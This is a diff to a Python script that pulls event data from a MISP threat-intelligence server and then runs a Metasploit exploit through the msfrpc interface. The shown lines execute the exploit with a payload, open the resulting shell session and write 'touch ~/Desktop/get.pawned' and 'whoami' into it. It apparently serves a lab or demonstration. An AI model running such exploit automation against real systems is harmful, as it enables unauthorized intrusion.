@@ -34,7 +34,6 @@ searcheventid = input("Enter EventID (optional): ")
 if not searcheventid:
     searcheventid = "1016"
 body = ('{"searchinfo":"%s", "searchpublished":1, "searchdistribution":0, "searcheventid":"%s"}' % (searchinfo, searcheventid))
-# body = '''{"searchinfo":"struts", "searchpublished":1, "searchdistribution":0, "searcheventid":149 }'''
 misp = PyMISP(misp_api_endpoint, misp_key, misp_verifycert)
 search_results = misp.direct_call(relative_path, body)
 data = json.dumps(search_results,sort_keys=True,indent=4)
@@ -188,10 +187,10 @@ exploit['TARGETURI'] = target_uri
 
 exploit['VERBOSE']= False
 exploit.execute(payload=payload)
-
-ex = exploit.execute(payload=payload)
+# open shell to create a file in desktop
 shell = msfrpc_obj.sessions.session(1)
 shell.write('touch ~/Desktop/get.pawned\n')
+# open shell to check who current user is
 more_shell = msfrpc_obj.sessions.session(1)
 more_shell.write('whoami\n')
 print ("who am i?")
